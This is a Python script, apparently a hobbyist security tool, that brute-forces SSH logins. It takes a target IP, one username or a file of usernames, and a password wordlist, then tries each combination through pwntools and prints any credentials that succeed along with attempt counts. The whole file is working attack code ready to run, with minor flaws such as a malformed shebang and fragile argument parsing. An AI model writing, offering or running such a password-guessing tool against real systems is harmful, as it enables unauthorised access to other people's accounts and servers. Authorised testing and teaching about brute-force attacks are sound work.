#!usr/bin/env python

from pwn import *
import paramiko
import optparse
import sys

def help_menu():
    usage = "python3 {} [-i target_ip] [-u username || -U usernamesfile] [-w wordlist]".format(sys.argv[0])
    arg=optparse.OptionParser(usage= usage)
    arg.add_option("-u", "--usname", dest= "username", help= "enter username of target ip e.g. <root>@192.168.1.1")
    arg.add_option("-U", "--usname-list", dest= "usernames_file", help= "file containing usernames")
    arg.add_option("-i", "--ipaddr", dest= "target_ip", help= "enter target ip e.g. root@<192.168.1.1>")
    arg.add_option("-w", "--wordlist", dest= "wordlist", help= "enter your wordlist")
    (options, arguments) = arg.parse_args()
    return options   

def count_wordlist(wordlist):
    with open(wordlist, 'r') as f:
        lines = f.readlines()
        return len(lines)

def count_username(usernamefile):
    with open(usernamefile, "r") as f:
        lines = f.readlines()
        return len(lines)

def ssh_bruteforce_manual_ip_username(target_ip, username, wordlist):
    attempts = 1 
    failed = 0
    count_password = count_wordlist(wordlist)
    with open(wordlist, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n")
            try:
               connection = ssh(host= target_ip, user= username, password= password, timeout= 2)
               if connection.connected():
                  connection.close()
                  print("\033[1;35mPassword found: '{}'\033[0m".format(password))
                  print("\033[1;31mLogin Attempts: {}\033[0m".format(attempts))
                  print("\033[1;31mLogin failed: {}\033[0m".format(failed))
                  break
               connection.close()
            except (EOFError, paramiko.ssh_exception.SSHException):
                failed += 1
            attempts += 1
        if count_password == failed:
            print("\033[1;31mGiven wordlist:'{}' does not contain correct password\033[0m".format(wordlist))

def ssh_bruteforce_list_username_ip(target_ip, usernames_file, wordlist):
    failed = 0
    count_password = count_wordlist(wordlist)
    count_usname = count_username(usernames_file)
    total_attempts = count_password*count_usname
    with open(usernames_file, "r") as username_list:
        for username in username_list:
            username = username.strip("\n")
            with open(wordlist, "r") as password_list:
                for password in password_list:
                    password = password.strip("\n")
                    try:
                        connection = ssh(host= target_ip, user=username, password= password, timeout= 2)
                        if connection.connected():
                            connection.close()
                            print("\033[1;35mUsername: '{}'\t\tPassword: '{}'\033[0m".format(username, password))
                            break
                        connection.close()
                    except (EOFError, paramiko.ssh_exception.SSHException):
                        failed += 1
        print("\033[1;33mTotal attempts: {}\033[0m".format(total_attempts))
        print("\033[1;33mTotal failed: {}\033[0m".format(failed))    

def main():
    try:
        if (sys.argv[1] == '-u' or sys.argv[1] == '--usname') and (sys.argv[3] == '-i' or sys.argv[3] == '--ipaddr') and (sys.argv[5] == '-w' or sys.argv[5] == '--wordlist'):
            ssh_bruteforce_manual_ip_username(options.target_ip, options.username, options.wordlist)
        elif (sys.argv[1] == '-U' or sys.argv[1] == '--usname-list') and (sys.argv[3] == '-i' or sys.argv[3] == '--ipaddr') and (sys.argv[5] == '-w' or sys.argv[5] == '--wordlist'):
            ssh_bruteforce_list_username_ip(options.target_ip, options.usernames_file, options.wordlist)
    except KeyboardInterrupt:
        print("\n\033[1;33m[*]\033[0m \033[1;31mExiting program...\033[0m")
        sys.exit() 

if __name__ == "__main__":
   options = help_menu()
   main()
